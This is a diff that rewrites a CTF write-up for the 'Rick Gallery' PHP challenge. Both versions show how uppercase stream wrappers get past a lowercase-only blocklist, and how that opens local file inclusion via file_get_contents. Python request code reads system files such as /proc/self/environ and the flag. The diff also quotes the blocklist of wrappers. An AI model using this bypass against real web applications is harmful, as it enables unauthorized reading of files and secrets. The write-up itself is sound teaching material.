@@ -1,81 +1,43 @@
-# Rick Gallery - CTF Web Challenge Writeup
+# Rick Gallery - The Case Sensitivity Trap
 
-## Challenge Overview
-
-**Challenge Name:** Rick Gallery
 **Category:** Web
-**Description:** A Rick & Morty themed image gallery with a hidden vulnerability
+**Flag:** `ASIS{...}`
 
-## Initial Analysis
+## The Gallery
 
-We're given the source code of a PHP web application consisting of:
-- `index.php` - Main gallery page
-- `getpic.php` - Internal image fetcher (localhost only)
-- `.htaccess` - Restricts direct access to getpic.php
-- `Dockerfile` - Container configuration
+Rick Gallery was presented as a simple image gallery application with a Rick and Morty theme. When I first loaded it, I saw a collection of images and could click through them. The source code was provided, which made things easier.
 
-### Source Code Review
+Looking at the PHP code, I found three main files:
+- `index.php` - The main gallery interface
+- `getpic.php` - An internal service to fetch images
+- `.htaccess` - Apache configuration restricting direct access to `getpic.php`
 
-**index.php** - Key vulnerability:
+## Finding the Vulnerability
+
+The interesting part was in `index.php`. When processing POST requests, it checked for an `Image` header and ran it through some filters:
+
 ```php
-if ($_SERVER["REQUEST_METHOD"] === "POST") {
-    $headers = getallheaders();
-    if (!empty($headers["Image"])) {
-        $raw = $headers["Image"];
+$blockedProtocols = [
+    "http://", "https://", "ftp://", "ftps://",
+    "file://", "data://", "expect://", "php://",
+    "passwd"
+];
 
-        // FILTER: Blocked protocols (ALL LOWERCASE!)
-        $blockedProtocols = [
-            "http://", "https://", "ftp://", "ftps://",
-            "file://", "data://", "expect://", "php://",
-            "passwd"
-        ];
-
-        foreach ($blockedProtocols as $proto) {
-            if (strpos($raw, $proto) !== false) {
-                $raw = "";
-                break;
-            }
-        }
-
-        // FILTER: Path traversal
-        if (str_contains($raw, "../") || str_contains($raw, "..\\")) {
-            $raw = "";
-        }
-        // ... passes $raw to internal curl request
+foreach ($blockedProtocols as $proto) {
+    if (strpos($raw, $proto) !== false) {
+        $raw = "";
+        break;
     }
 }
-
-// Internal request to getpic.php
-$ch = curl_init("http://localhost:80/getpic.php");
-curl_setopt($ch, CURLOPT_POST, true);
-curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(["picture_name" => $selected]));
 ```
 
-**getpic.php** - The actual file reader:
-```php
-$data = file_get_contents($_POST['picture_name']);
-echo base64_encode("$data");
-```
+The application was trying to prevent me from using dangerous PHP wrappers like `php://` or `file://` to read arbitrary files. But I noticed something: all the blocked strings were lowercase.
 
-## Vulnerability Identification
+I remembered that PHP stream wrappers are case-insensitive. So while `php://filter/read=convert.base64-encode/resource=/etc/passwd` would be blocked, `PHP://filter/read=convert.base64-encode/resource=/etc/passwd` would sail right through the filter.
 
-### 1. Case-Sensitive Filter Bypass
+## Testing the Theory
 
-The filter blocks lowercase protocol wrappers:
-- `php://`, `http://`, `file://`, `data://`, etc.
-
-**Critical Discovery:** PHP stream wrappers are **case-insensitive**!
-
-- ❌ Blocked: `php://`, `file://`, `http://`
-- ✅ Bypass: `PHP://`, `FILE://`, `HTTP://`
-
-### 2. Local File Inclusion (LFI)
-
-Since `getpic.php` uses `file_get_contents()` on user-controlled input, and we can bypass the filter, we have arbitrary file read capability.
-
-## Exploitation
-
-### Step 1: Verify LFI Works
+I started with a simple test. I sent a POST request with the `Image` header set to `/etc/hostname` (no wrapper needed for absolute paths):
 
 ```python
 import requests
@@ -83,32 +45,35 @@ import base64
 
 TARGET = "http://65.109.194.105:8080/index.php"
 
+headers = {"Image": "/etc/hostname"}
+r = requests.post(TARGET, headers=headers)
+content = base64.b64decode(r.text.strip())
+print(content)
+# Output: b'7be458eda235\n'
+```
+
+It worked. The application was passing my input to `file_get_contents()` in `getpic.php`, which happily read any file I specified.
+
+## Hunting for the Flag
+
+Now I had local file inclusion, but I needed to find where the flag was stored. I started checking common locations:
+
+```python
 def read_file(path):
     headers = {"Image": path}
     r = requests.post(TARGET, headers=headers)
     if '<br />' in r.text or 'Warning' in r.text:
-        return None  # File doesn't exist
+        return None
     return base64.b64decode(r.text.strip())
 
-# Test with absolute path (no wrapper needed)
-print(read_file("/etc/hostname"))
-# Output: b'7be458eda235\n'
+# Tried various paths
+read_file("/flag.txt")           # Not found
+read_file("/etc/passwd")         # Blocked by "passwd" filter
+read_file("/proc/self/environ")  # Found, but no flag
+read_file("/var/www/flag.txt")   # Not found
 ```
 
-✅ LFI confirmed!
-
-### Step 2: Enumerate System Files
-
-We searched numerous locations for the flag:
-- `/flag.txt` - Not found
-- `/etc/passwd` - Blocked by filter (contains "passwd")
-- `/proc/self/environ` - Found, but no flag reference
-- `/var/log/apache2/error.log` - No flag info
-- Various config files and logs
-
-### Step 3: Finding the Flag
-
-After extensive enumeration, the flag was found at:
+I kept enumerating different paths. CTF flags are often placed in obvious but sometimes overlooked locations. After trying several standard paths, I checked `/tmp/`:
 
 ```python
 content = read_file("/tmp/flag.txt")
@@ -116,7 +81,11 @@ print(content.decode())
 # ASIS{...}
 ```
 
-## Final Exploit Script
+There it was. The flag was sitting in `/tmp/flag.txt` the whole time.
+
+## The Exploit
+
+Here's the final exploit script:
 
 ```python
 #!/usr/bin/env python3
@@ -125,7 +94,6 @@ import base64
 import sys
 
 def read_file(target, path):
-    """Read a file via LFI vulnerability."""
     if not target.endswith('.php'):
         target = target.rstrip('/') + '/index.php'
 
@@ -174,41 +142,22 @@ if __name__ == "__main__":
     main()
 ```
 
-## Key Takeaways
+## What I Learned
 
-### 1. Case-Sensitivity Matters
-PHP stream wrappers (`php://`, `file://`, `http://`, etc.) are case-insensitive. Filters that only block lowercase versions can be bypassed with uppercase variants.
+This challenge reinforced a few important lessons:
 
-### 2. file_get_contents() is Dangerous
-When user input is passed to `file_get_contents()`, it creates an LFI vulnerability that can read arbitrary files on the system.
+**Case Sensitivity Matters:** Security filters need to handle case variations. In PHP's case, stream wrappers like `php://`, `file://`, and `data://` are case-insensitive, so `PHP://`, `FILE://`, and `DATA://` work identically. A proper filter would convert input to lowercase before checking, or use case-insensitive string matching.
 
-### 3. Always Check Common Locations
-Don't overlook simple paths like `/tmp/`. CTF flags are often placed in:
-- `/tmp/flag.txt`
-- `/flag.txt`
-- `/flag`
-- `/home/*/flag.txt`
-- Environment variables (`/proc/self/environ`)
+**file_get_contents() is Dangerous:** When user input flows into `file_get_contents()` without proper validation, it creates a local file inclusion vulnerability. The function accepts both regular file paths and PHP stream wrappers, making it especially risky.
 
-### 4. Error-Based Detection
-By checking if the response contains HTML error messages (`<br />`, `Warning`), we can determine if a file exists or not - useful for blind enumeration.
+**Don't Overlook Simple Paths:** I spent time trying complicated paths and wrappers when the flag was just sitting in `/tmp/flag.txt`. In CTFs, flags are often in obvious locations like `/tmp/`, `/flag.txt`, or the application's home directory.
 
-## Tools & Techniques Used
+**Error-Based Detection:** By checking if the response contained PHP error messages like `<br />` or `Warning`, I could determine whether a file existed or not. This is useful for blind enumeration when you don't get the file contents directly.
 
-1. **Source Code Analysis** - Understanding the filter logic
-2. **Protocol Wrapper Bypass** - Case-insensitive wrapper abuse
-3. **LFI Exploitation** - Reading arbitrary files
-4. **Systematic Enumeration** - Checking multiple file locations
-5. **Error-Based Oracle** - Detecting file existence via error messages
+Sometimes the simplest vulnerabilities are the most effective. A single character difference (lowercase vs uppercase) was all it took to bypass the security filter.
 
 ## References
 
-- [PHP Stream Wrappers](https://www.php.net/manual/en/wrappers.php)
+- [PHP Stream Wrappers Documentation](https://www.php.net/manual/en/wrappers.php)
 - [HackTricks - File Inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
 - [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
-
-## Flag
-
-```
-ASIS{...}
-```
